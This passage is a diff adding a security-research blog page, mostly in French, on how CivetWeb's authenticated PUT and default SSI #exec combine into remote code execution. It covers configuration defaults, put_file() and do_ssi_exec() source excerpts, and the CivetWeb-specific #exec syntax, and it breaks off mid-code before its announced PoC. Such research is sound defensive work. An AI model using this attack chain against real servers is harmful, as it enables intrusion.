@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Technical analysis: how two fully legitimate CivetWeb features (authenticated PUT + SSI #exec) combine to produce arbitrary remote code execution. Live demo, source code, and hardening recommendations. By BUG|PWN.">
+    <meta name="keywords" content="CivetWeb, SSI injection, Server Side Includes, PUT RCE, embedded web server, popen, ssi_pattern, put_delete_auth_file, web security, pentest">
+    <meta property="og:title" content="CivetWeb : PUT + SSI = RCE | BUG|PWN">
+    <meta property="og:description" content="Technical analysis: two legitimate CivetWeb features combined produce arbitrary remote code execution. Live demonstration and hardening recommendations.">
+    <meta property="og:image" content="https://bugpwn.com/static/bugpwn@1x.png">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bugpwn.com/blog/civetweb-ssi-rce.html">
+    <meta property="og:site_name" content="BUG|PWN">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:locale:alternate" content="fr_FR">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="CivetWeb : PUT + SSI = RCE | BUG|PWN">
+    <meta name="twitter:description" content="Two legitimate CivetWeb features combined produce RCE. Technical analysis with source code and live demo.">
+    <meta name="twitter:image" content="https://bugpwn.com/static/bugpwn@1x.png">
+    <link rel="canonical" href="https://bugpwn.com/blog/civetweb-ssi-rce.html">
+    <title>CivetWeb : PUT + SSI = RCE | BUG|PWN</title>
+    <link rel="icon" type="image/png" href="../static/bugpwn.png">
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Article",
+        "headline": "CivetWeb: Authenticated PUT + SSI #exec = RCE",
+        "description": "Technical analysis of a combination of two legitimate CivetWeb features producing arbitrary remote code execution.",
+        "image": "https://bugpwn.com/static/bugpwn@1x.png",
+        "datePublished": "2026-07-01",
+        "dateModified": "2026-07-01",
+        "author": { "@type": "Organization", "name": "BUG|PWN", "url": "https://bugpwn.com/" },
+        "publisher": { "@type": "Organization", "name": "BUG|PWN", "logo": { "@type": "ImageObject", "url": "https://bugpwn.com/static/bugpwn.png" } },
+        "mainEntityOfPage": { "@type": "WebPage", "@id": "https://bugpwn.com/blog/civetweb-ssi-rce.html" }
+    }
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&family=JetBrains+Mono:wght@500;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #ffffff; color: #000000; scroll-behavior: smooth; }
+        .mono { font-family: 'JetBrains Mono', monospace; }
+        .btn-black { background-color: #000; color: #fff; transition: all 0.2s ease; }
+        .btn-black:hover { background-color: #333; transform: translateY(-1px); }
+
+        .article-body h2 { font-size: 1.5rem; font-weight: 900; text-transform: uppercase; letter-spacing: -0.05em; margin-top: 5rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 2px solid #000; }
+        .article-body h3 { font-size: 1.125rem; font-weight: 700; text-transform: uppercase; letter-spacing: -0.02em; margin-top: 3rem; margin-bottom: 1.5rem; }
+        .article-body p { color: #4b5563; font-weight: 300; line-height: 1.8; margin-bottom: 1.5rem; font-size: 1.125rem; }
+        .article-body strong { color: #000; font-weight: 700; }
+        .article-body ul { margin-bottom: 2rem; color: #4b5563; font-weight: 300; font-size: 1.125rem; }
+        .article-body li { margin-bottom: 0.75rem; padding-left: 1.5rem; position: relative; }
+        .article-body li::before { content: '>'; position: absolute; left: 0; font-family: 'JetBrains Mono'; font-weight: 800; font-size: 0.8rem; color: #000; top: 0.2rem; }
+        .article-body code { font-family: 'JetBrains Mono', monospace; background-color: #f3f4f6; color: #000; padding: 0.1rem 0.4rem; font-size: 0.85em; font-weight: 600; border: 1px solid #e5e7eb; }
+
+        .box { border-radius: 4px; padding: 1.25rem 1.5rem; margin: 2rem 0; border-left: 4px solid; }
+        .box-title { font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.12em; margin-bottom: 0.5rem; }
+        .box p { font-size: 0.95rem !important; margin-bottom: 0 !important; }
+        .box.info  { background: #eff6ff; border-color: #3b82f6; }
+        .box.info  .box-title { color: #1d4ed8; }
+        .box.warn  { background: #fffbeb; border-color: #f59e0b; }
+        .box.warn  .box-title { color: #b45309; }
+        .box.danger{ background: #fef2f2; border-color: #ef4444; }
+        .box.danger .box-title { color: #b91c1c; }
+        .box.ok    { background: #f0fdf4; border-color: #22c55e; }
+        .box.ok    .box-title { color: #15803d; }
+
+        .tbl { width: 100%; border-collapse: collapse; font-size: 0.9rem; margin: 2rem 0; }
+        .tbl th { text-align: left; padding: 0.6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.08em; color: #6b7280; border-bottom: 2px solid #000; font-weight: 700; }
+        .tbl td { padding: 0.6rem 1rem; border-bottom: 1px solid #e5e7eb; color: #374151; line-height: 1.5; }
+        .tbl tr:last-child td { border-bottom: none; }
+        .bdg { font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; font-weight: 800; padding: 2px 8px; border-radius: 3px; display: inline-block; }
+        .bdg.r { background: #fef2f2; color: #b91c1c; }
+        .bdg.g { background: #f0fdf4; color: #15803d; }
+        .bdg.b { background: #eff6ff; color: #1d4ed8; }
+        .bdg.a { background: #fffbeb; color: #b45309; }
+
+        .steps { margin: 2rem 0; }
+        .step { display: flex; gap: 1rem; margin-bottom: 1rem; align-items: flex-start; }
+        .sn { width: 28px; height: 28px; min-width: 28px; border-radius: 50%; background: #000; color: #fff; display: flex; align-items: center; justify-content: center; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; font-weight: 800; margin-top: 2px; }
+        .sb-title { font-weight: 700; font-size: 0.95rem; color: #000; margin-bottom: 0.2rem; }
+        .sb-desc { font-size: 0.875rem; color: #4b5563; line-height: 1.65; font-weight: 300; }
+        .sb-desc code { font-family: 'JetBrains Mono', monospace; background-color: #f3f4f6; color: #000; padding: 0.1rem 0.4rem; font-size: 0.8em; font-weight: 600; border: 1px solid #e5e7eb; border-radius: 2px; }
+
+        .no-scrollbar::-webkit-scrollbar { height: 6px; }
+        .no-scrollbar::-webkit-scrollbar-track { background: transparent; }
+        .no-scrollbar::-webkit-scrollbar-thumb { background: #333; }
+
+        .hl { background: rgba(239,68,68,0.12); display: block; margin: 0 -1.5rem; padding: 0 1.5rem; border-left: 3px solid #ef4444; }
+    </style>
+</head>
+<body class="antialiased">
+
+    <!-- NAV -->
+    <nav class="w-full py-6 px-6 md:px-12 bg-white/80 backdrop-blur-md sticky top-0 z-50 border-b border-gray-100">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <a href="../index.html" class="text-xl font-extrabold tracking-tighter flex items-center gap-1">
+                <span class="bg-black text-white px-1.5 py-0.5 rounded-sm">BUG</span>
+                <span>|PWN</span>
+            </a>
+            <div class="hidden md:flex gap-10 text-[13px] font-medium uppercase tracking-[0.15em] text-gray-500">
+                <a href="../index.html#services" class="hover:text-black transition-colors" data-i18n="nav_services">Services</a>
+                <a href="../research.html" class="hover:text-black transition-colors" data-i18n="nav_research">Recherche</a>
+                <a href="../blog.html" class="text-black font-bold transition-colors" data-i18n="nav_blog">Blog</a>
+                <a href="../events.html" class="hover:text-black transition-colors" data-i18n="nav_events">Events</a>
+            </div>
+            <div class="hidden md:flex items-center gap-4">
+                <button id="lang-toggle" class="text-[13px] font-bold uppercase tracking-wider text-gray-500 hover:text-black transition-colors">EN</button>
+                <a href="../contact.html" class="btn-black px-6 py-2.5 rounded text-[13px] font-bold uppercase tracking-wider" data-i18n="nav_contact">Nous contacter</a>
+            </div>
+            <div class="md:hidden flex items-center">
+                <button id="mobile-menu-button" class="text-gray-800 text-2xl focus:outline-none">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </div>
+        </div>
+        <div id="mobile-menu" class="hidden md:hidden">
+            <div class="pt-4 pb-3 space-y-1">
+                <a href="../index.html#services" class="block py-2 px-4 text-base font-medium text-gray-700 hover:text-black hover:bg-gray-50" data-i18n="nav_services">Services</a>
+                <a href="../research.html" class="block py-2 px-4 text-base font-medium text-gray-700 hover:text-black hover:bg-gray-50" data-i18n="nav_research">Recherche</a>
+                <a href="../blog.html" class="block py-2 px-4 text-base font-medium text-gray-700 hover:text-black hover:bg-gray-50" data-i18n="nav_blog">Blog</a>
+                <a href="../events.html" class="block py-2 px-4 text-base font-medium text-gray-700 hover:text-black hover:bg-gray-50" data-i18n="nav_events">Events</a>
+                <a href="../contact.html" class="block py-2 px-4 text-base font-medium text-gray-700 hover:text-black hover:bg-gray-50" data-i18n="nav_contact">Nous contacter</a>
+                <button id="lang-toggle-mobile" class="block w-full text-left py-2 px-4 text-base font-medium text-gray-700 hover:text-black hover:bg-gray-50">EN</button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- HEADER -->
+    <header class="max-w-7xl mx-auto px-6 py-24 md:py-32">
+        <div class="max-w-4xl mx-auto">
+            <a href="../blog.html" class="inline-flex items-center gap-4 text-[10px] font-black uppercase tracking-[0.4em] text-gray-400 hover:text-black transition-colors mb-12 group" data-i18n="art_back">
+                <i class="fas fa-arrow-left group-hover:-translate-x-2 transition-transform"></i> Retour_Archives
+            </a>
+            <div class="flex flex-wrap gap-4 mb-8">
+                <span class="border border-black px-3 py-1 text-[9px] font-black uppercase tracking-widest mono bg-gray-50 text-black" data-i18n="tag_sec">Web Security</span>
+                <span class="border border-black px-3 py-1 text-[9px] font-black uppercase tracking-widest mono bg-black text-white" data-i18n="tag_research">Research</span>
+                <span class="border border-orange-300 px-3 py-1 text-[9px] font-black uppercase tracking-widest mono bg-orange-50 text-orange-700" data-i18n="tag_rce">RCE · Demo Live</span>
+                <span class="border border-gray-200 px-3 py-1 text-[9px] font-black uppercase tracking-widest mono text-gray-500">01.JUL.2026</span>
+            </div>
+            <h1 class="text-5xl md:text-7xl font-black uppercase tracking-tighter leading-[1.05] mb-8" data-i18n="art_title">
+                CivetWeb :<br>
+                <span class="text-gray-300">PUT + SSI</span><br>
+                = RCE.
+            </h1>
+            <p class="text-xl text-gray-500 max-w-2xl leading-relaxed font-light border-l-2 border-black pl-8 mb-4" data-i18n="art_subtitle">
+                Comment deux fonctionnalités entièrement légitimes et documentées de CivetWeb se combinent silencieusement pour produire une exécution de commande arbitraire à distance. Analyse du code source, démonstration en conditions réelles et recommandations de hardening.
+            </p>
+            <div class="flex flex-wrap gap-4 text-sm text-gray-500 font-light mb-16">
+                <span data-i18n="art_level">Niveau : intermédiaire</span>
+                <span>·</span>
+                <span data-i18n="art_read_time">Lecture : 15 min</span>
+                <span>·</span>
+                <span data-i18n="art_tag">CivetWeb 1.17 · <strong style="color:#b45309">Medium (auth requise)</strong></span>
+            </div>
+            <div class="flex items-center gap-6 border-t border-gray-200 pt-8">
+                <div class="w-16 h-16 bg-black text-white flex items-center justify-center font-black text-2xl">R</div>
+                <div>
+                    <div class="text-sm font-black uppercase tracking-widest">Sadoc ADONON</div>
+                    <div class="text-[10px] text-gray-500 uppercase tracking-[0.2em] mono mt-1" data-i18n="art_author_role">Lead Vulnerability Researcher</div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- TABLE DES MATIERES -->
+    <section class="max-w-4xl mx-auto px-6 py-16">
+        <div class="bg-gray-50 border border-gray-200 rounded-lg p-8">
+            <h2 style="font-size:1.125rem;font-weight:700;text-transform:uppercase;letter-spacing:-0.02em;margin-bottom:1.5rem;border:none;padding:0;margin-top:0;" data-i18n="toc_title">Table des matières</h2>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:2rem;font-size:0.95rem;">
+                <div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_1"><strong>01.</strong> Résumé exécutif</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_2"><strong>02.</strong> Contexte : CivetWeb</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_3"><strong>03.</strong> La brique 1 : PUT authentifié</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_4"><strong>04.</strong> La brique 2 : SSI #exec par défaut</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_5"><strong>05.</strong> Analyse du code source</div>
+                </div>
+                <div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_6"><strong>06.</strong> Chemin de données complet</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_7"><strong>07.</strong> Démonstration live (PoC)</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_8"><strong>08.</strong> Pourquoi ce n'est pas un CVE</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_9"><strong>09.</strong> Recommandations</div>
+                    <div style="margin-bottom:0.75rem;" data-i18n="toc_10"><strong>10.</strong> Références</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ARTICLE -->
+    <main class="max-w-3xl mx-auto px-6 pb-32 article-body">
+
+        <!-- 01 RESUME EXECUTIF -->
+        <h2 data-i18n="s1_h2">01 - Résumé exécutif</h2>
+
+        <p data-i18n="s1_p1">
+            <strong>CivetWeb</strong> est un serveur HTTP embarqué open-source très utilisé dans les systèmes IoT, les équipements industriels et les applications C/C++ nécessitant un serveur web intégré. Sa conception monofichier (<code>civetweb.c</code>, environ 23 000 lignes) le rend attractif pour l'embarqué, mais concentre également une grande surface de code dans un seul composant.
+        </p>
+        <p data-i18n="s1_p2">
+            Lors d'un audit de code complet de la version <strong>1.17</strong> (branche master, commit <code>588860e3</code>), nous avons identifié une combinaison de deux fonctionnalités entièrement légitimes et documentées qui, une fois activées ensemble, permettent à tout utilisateur disposant d'identifiants PUT d'exécuter des commandes arbitraires sur le serveur. Ce n'est pas un bug du code, mais une interaction non documentée entre deux options de configuration.
+        </p>
+
+        <div class="box danger">
+            <div class="box-title" data-i18n="s1_b_t">Impact réel sur les déploiements</div>
+            <p data-i18n="s1_b_p">Tout déploiement CivetWeb ayant activé <code>put_delete_auth_file</code> (PUT distant avec authentification) est exposé au RCE complet pour n'importe quel compte autorisé au PUT, y compris les comptes "upload seulement" pensés comme non-privilégiés. Le SSI <code>#exec</code> étant actif par défaut pour <code>*.shtml</code> et <code>*.shtm</code>, aucune configuration supplémentaire n'est requise du côté de l'attaquant.</p>
+        </div>
+
+        <table class="tbl">
+            <thead>
+                <tr>
+                    <th data-i18n="th_attr">Attribut</th>
+                    <th data-i18n="th_val">Valeur</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td data-i18n="s1_td1">Logiciel</td><td>CivetWeb 1.17 (branche master)</td></tr>
+                <tr><td data-i18n="s1_td2">Type</td><td data-i18n="s1_td2_v">Combinaison de fonctionnalités : File Upload + SSI Exec (CWE-434 + CWE-1188)</td></tr>
+                <tr><td data-i18n="s1_td3">Prérequis</td><td data-i18n="s1_td3_v"><code>put_delete_auth_file</code> configuré + identifiants PUT valides</td></tr>
+                <tr><td data-i18n="s1_td4">Impact</td><td data-i18n="s1_td4_v">RCE avec les droits du processus serveur</td></tr>
+                <tr><td data-i18n="s1_td5">Vecteur</td><td data-i18n="s1_td5_v">Réseau (HTTP PUT + HTTP GET)</td></tr>
+                <tr><td data-i18n="s1_td6">Sévérité (CVSS-like)</td><td data-i18n="s1_td6_v"><span class="bdg a">Medium (6.8) si auth</span></td></tr>
+                <tr><td data-i18n="s1_td7">CVE assigné</td><td data-i18n="s1_td7_v"><span class="bdg b">Non (comportement documenté)</span></td></tr>
+                <tr><td data-i18n="s1_td8">Correction recommandée</td><td data-i18n="s1_td8_v">Désactiver <code>ssi_pattern</code> si PUT actif, ou séparer les docroots</td></tr>
+            </tbody>
+        </table>
+
+        <!-- 02 CONTEXTE CIVETWEB -->
+        <h2 data-i18n="s2_h2">02 - Contexte : CivetWeb</h2>
+
+        <h3 data-i18n="s2_h3_1">Qu'est-ce que CivetWeb ?</h3>
+        <p data-i18n="s2_p1">
+            CivetWeb est un fork de Mongoose (avant sa bifurcation commerciale), maintenu comme projet open-source. Il est conçu pour être intégré directement dans une application C/C++ via l'inclusion d'un seul fichier source. On le retrouve fréquemment dans des interfaces web d'équipements réseau, des consoles d'administration IoT, des logiciels embarqués industriels, et des outils de développement local.
+        </p>
+        <p data-i18n="s2_p2">
+            Son modèle de configuration repose sur des paires clé/valeur passées au démarrage du serveur, soit par fichier de configuration, soit par arguments en ligne de commande. Deux de ces options sont au coeur de notre analyse : <code>put_delete_auth_file</code>, qui active la méthode HTTP PUT pour écrire des fichiers sur le serveur, et <code>ssi_pattern</code>, qui définit les extensions de fichiers interprétés comme des pages SSI (Server Side Includes).
+        </p>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+            <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+                <div class="flex items-center gap-3">
+                    <div class="flex gap-1.5">
+                        <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+                    </div>
+                    <span class="w-px h-4 bg-gray-700"></span>
+                    <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">civetweb.c:2196-2200</span>
+                    <span class="font-mono text-[9px] text-gray-600 tracking-widest" data-i18n="s2_lbl_1">- Configuration par défaut des deux options clés</span>
+                </div>
+                <button onclick="copyToClipboard('code-config', this)" class="font-mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+                    <i class="far fa-copy"></i> COPIER
+                </button>
+            </div>
+            <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-config"><span style="color:#6e7681">// src/civetweb.c - table de configuration par défaut</span>
+
+<span style="color:#6e7681">// Option PUT/DELETE : NULL par défaut = PUT complètement désactivé</span>
+{ <span style="color:#a5d6ff">"put_delete_auth_file"</span>, MG_CONFIG_TYPE_FILE, <span style="color:#ff7b72">NULL</span> },
+
+<span style="color:#6e7681">// SSI pattern : actif par défaut pour *.shtml et *.shtm</span>
+<span style="color:#6e7681">// Tout fichier servi avec ces extensions sera parsé pour des directives SSI</span>
+<span class="hl">{ <span style="color:#a5d6ff">"ssi_pattern"</span>, MG_CONFIG_TYPE_EXT_PATTERN, <span style="color:#a5d6ff">"**.shtml$|**.shtm$"</span> },</span>
+
+<span style="color:#6e7681">// Index files : .shtml est inclus par défaut comme page d'index possible</span>
+{ <span style="color:#a5d6ff">"index_files"</span>, MG_CONFIG_TYPE_STRING,
+  <span style="color:#a5d6ff">"index.xhtml,index.html,index.htm,index.cgi,index.shtml,index.php"</span> },</pre>
+        </div>
+
+        <div class="box info">
+            <div class="box-title" data-i18n="s2_b_t">Modèle de confiance implicite</div>
+            <p data-i18n="s2_b_p">La documentation de <code>put_delete_auth_file</code> décrit cette option comme permettant "l'écriture de fichiers sur le serveur via PUT". La documentation de <code>ssi_pattern</code> décrit le SSI comme un "langage de templating serveur simple". Aucune des deux pages de documentation ne mentionne que les combiner équivaut à donner un accès shell à tout compte PUT.</p>
+        </div>
+
+        <!-- 03 BRIQUE 1 : PUT -->
+        <h2 data-i18n="s3_h2">03 - La brique 1 : PUT authentifié sans restriction d'extension</h2>
+
+        <p data-i18n="s3_p1">
+            Lorsqu'un administrateur configure <code>put_delete_auth_file</code> pour pointer vers un fichier de mots de passe digest, CivetWeb accepte les requêtes HTTP PUT authentifiées et écrit leur corps directement sur le disque dans le <code>document_root</code>. La fonction qui gère cette écriture est <code>put_file()</code> à la ligne 12500 de <code>civetweb.c</code>.
+        </p>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+            <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+                <div class="flex items-center gap-3">
+                    <div class="flex gap-1.5">
+                        <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+                    </div>
+                    <span class="w-px h-4 bg-gray-700"></span>
+                    <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">civetweb.c:12500</span>
+                    <span class="font-mono text-[9px] text-gray-600 tracking-widest" data-i18n="s3_lbl_1">- put_file() : aucune restriction d'extension</span>
+                </div>
+                <button onclick="copyToClipboard('code-put', this)" class="font-mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+                    <i class="far fa-copy"></i> COPIER
+                </button>
+            </div>
+            <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-put"><span style="color:#ff7b72">static</span> <span style="color:#ff7b72">void</span>
+<span style="color:#d2a8ff">put_file</span>(<span style="color:#ff7b72">struct</span> <span style="color:#ffa657">mg_connection</span> *conn, <span style="color:#ff7b72">const char</span> *path)
+{
+    <span style="color:#ff7b72">struct</span> <span style="color:#ffa657">mg_file</span> file = STRUCT_FILE_INITIALIZER;
+    <span style="color:#ff7b72">const char</span> *range;
+    int64_t r1, r2;
+    int rc;
+
+    <span style="color:#6e7681">/* ... */</span>
+
+    <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff">mg_stat</span>(conn, path, &amp;file.stat)) {
+        <span style="color:#6e7681">/* Fichier existant : vérifier les droits d'écriture OS */</span>
+        <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff">access</span>(path, W_OK) == <span style="color:#79c0ff">0</span>) {
+            rc = <span style="color:#79c0ff">1</span>; <span style="color:#6e7681">/* accès accordé */</span>
+        }
+    } <span style="color:#ff7b72">else</span> {
+        <span style="color:#6e7681">/* Nouveau fichier : créer les répertoires intermédiaires */</span>
+        conn-&gt;status_code = <span style="color:#79c0ff">201</span>;
+        rc = <span style="color:#d2a8ff">put_dir</span>(conn, path);
+    }
+<span class="hl">    <span style="color:#6e7681">/* AUCUNE vérification de l'extension du fichier écrit. */</span></span>
+<span class="hl">    <span style="color:#6e7681">/* Un PUT /evil.shtml est traité identiquement à PUT /image.png */</span></span>
+    <span style="color:#6e7681">/* Le corps de la requête est écrit tel quel sur le disque. */</span>
+}</pre>
+        </div>
+
+        <p data-i18n="s3_p2">
+            La vérification d'autorisation en amont (<code>is_authorized_for_put()</code>) confirme uniquement que l'utilisateur connaît les identifiants du fichier <code>put_delete_auth_file</code>. Elle ne pose aucune question sur l'extension ou le contenu du fichier que cet utilisateur veut déposer. Un compte PUT est strictement équivalent, en termes de capacité réelle, à un accès FTP complet au <code>document_root</code>.
+        </p>
+
+        <!-- 04 BRIQUE 2 : SSI -->
+        <h2 data-i18n="s4_h2">04 - La brique 2 : SSI #exec actif par défaut</h2>
+
+        <p data-i18n="s4_p1">
+            Les Server Side Includes (SSI) sont une technologie de templating serveur des années 90, permettant d'inclure dynamiquement du contenu dans une page HTML sans passer par un langage de script complet. CivetWeb supporte deux directives SSI : <code>include</code> (inclusion d'un autre fichier) et <code>exec</code> (exécution d'une commande shell et inclusion de sa sortie standard dans la réponse).
+        </p>
+        <p data-i18n="s4_p2">
+            La correspondance extension/interprétation SSI est vérifiée par <code>match_prefix_strlen()</code> sur la valeur de <code>ssi_pattern</code> avant chaque service de fichier. La valeur par défaut <code>"**.shtml$|**.shtm$"</code> s'applique à tous les fichiers sous n'importe quel sous-répertoire du <code>document_root</code> dont le nom se termine par <code>.shtml</code> ou <code>.shtm</code>. Aucune option séparée n'existe pour désactiver uniquement <code>#exec</code> en gardant <code>#include</code> actif.
+        </p>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+            <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+                <div class="flex items-center gap-3">
+                    <div class="flex gap-1.5">
+                        <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+                    </div>
+                    <span class="w-px h-4 bg-gray-700"></span>
+                    <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">civetweb.c:12784</span>
+                    <span class="font-mono text-[9px] text-gray-600 tracking-widest" data-i18n="s4_lbl_1">- do_ssi_exec() : popen() sans filtrage</span>
+                </div>
+                <button onclick="copyToClipboard('code-ssi', this)" class="font-mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+                    <i class="far fa-copy"></i> COPIER
+                </button>
+            </div>
+            <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-ssi"><span style="color:#ff7b72">static void</span>
+<span style="color:#d2a8ff">do_ssi_exec</span>(<span style="color:#ff7b72">struct</span> <span style="color:#ffa657">mg_connection</span> *conn, <span style="color:#ff7b72">char</span> *tag)
+{
+    <span style="color:#ff7b72">char</span> cmd[<span style="color:#79c0ff">1024</span>] = <span style="color:#a5d6ff">""</span>;
+    <span style="color:#ff7b72">struct</span> <span style="color:#ffa657">mg_file</span> file = STRUCT_FILE_INITIALIZER;
+
+    <span style="color:#6e7681">/* tag = contenu de la balise après "exec"      */</span>
+    <span style="color:#6e7681">/* Format attendu : "commande" (avec guillemets) */</span>
+    <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff">sscanf</span>(tag, <span style="color:#a5d6ff">" \"%1023[^\"]\""</span>, cmd) != <span style="color:#79c0ff">1</span>) {
+        <span style="color:#d2a8ff">mg_cry_internal</span>(conn, <span style="color:#a5d6ff">"Bad SSI #exec: [%s]"</span>, tag);
+    } <span style="color:#ff7b72">else</span> {
+        cmd[<span style="color:#79c0ff">1023</span>] = <span style="color:#79c0ff">0</span>;
+<span class="hl">        <span style="color:#6e7681">/* Exécution directe via /bin/sh -c (POSIX) ou cmd.exe (Windows) */</span></span>
+<span class="hl">        <span style="color:#6e7681">/* La commande est lue depuis le fichier .shtml, sans aucun filtrage */</span></span>
+<span class="hl">        <span style="color:#ff7b72">if</span> ((file.access.fp = <span style="color:#d2a8ff">popen</span>(cmd, <span style="color:#a5d6ff">"r"</span>)) == NULL) {</span>
+            <span style="color:#d2a8ff">mg_cry_internal</span>(conn, <span style="color:#a5d6ff">"Cannot SSI #exec: [%s]: %s"</span>, cmd, <span style="color:#d2a8ff">strerror</span>(ERRNO));
+        } <span style="color:#ff7b72">else</span> {
+            <span style="color:#6e7681">/* La sortie standard de la commande est envoyée directement */</span>
+            <span style="color:#6e7681">/* dans la réponse HTTP au client qui a fait le GET */</span>
+            <span style="color:#d2a8ff">send_file_data</span>(conn, &amp;file, <span style="color:#79c0ff">0</span>, INT64_MAX, <span style="color:#79c0ff">0</span>);
+            <span style="color:#d2a8ff">pclose</span>(file.access.fp);
+        }
+    }
+}</pre>
+        </div>
+
+        <div class="box warn">
+            <div class="box-title" data-i18n="s4_b_t">Syntaxe SSI spécifique à CivetWeb</div>
+            <p data-i18n="s4_b_p">Attention : la syntaxe <code>#exec</code> dans CivetWeb est <strong>différente</strong> de la syntaxe Apache classique. CivetWeb attend <code>&lt;!--#exec "commande"--&gt;</code> (sans <code>cmd=</code>), contrairement à <code>&lt;!--#exec cmd="commande"--&gt;</code> utilisé par Apache mod_include. Le <code>sscanf</code> interne parse le premier guillemet immédiatement après le nom de la directive.</p>
+        </div>
+
+        <!-- 05 CODE SOURCE -->
+        <h2 data-i18n="s5_h2">05 - Analyse du code source : les deux points de jonction</h2>
+
+        <h3 data-i18n="s5_h3_1">Point 1 : le dispatching SSI dans la pipeline de service de fichiers</h3>
+        <p data-i18n="s5_p1">
+            Après résolution de l'URI en chemin de fichier et vérification des droits de lecture, CivetWeb teste systématiquement si le chemin correspond au pattern SSI <strong>avant</strong> de décider comment servir le fichier. Ce test est présent à trois endroits du code : ligne 7802 (sélection de l'index), ligne 12772 (traitement des includes SSI) et ligne 15825 (dispatch principal).
+        </p>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+            <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+                <div class="flex items-center gap-3">
+                    <div class="flex gap-1.5">
+                        <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+                    </div>
+                    <span class="w-px h-4 bg-gray-700"></span>
+                    <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">civetweb.c:15820</span>
+                    <span class="font-mono text-[9px] text-gray-600 tracking-widest" data-i18n="s5_lbl_1">- Dispatch principal : GET sur un .shtml</span>
+                </div>
+            </div>
+            <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-dispatch"><span style="color:#6e7681">/* Après résolution du chemin et vérification auth (GET/HEAD) */</span>
+
+<span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff">match_prefix_strlen</span>(
+        conn-&gt;dom_ctx-&gt;config[SSI_EXTENSIONS], path) &gt; <span style="color:#79c0ff">0</span>) {
+    <span style="color:#6e7681">/* Le nom de fichier correspond à ssi_pattern : interprété comme SSI */</span>
+<span class="hl">    <span style="color:#d2a8ff">handle_ssi_file_request</span>(conn, path, &amp;file);</span>
+} <span style="color:#ff7b72">else if</span> (is_not_modified(conn, &amp;file.stat)) {
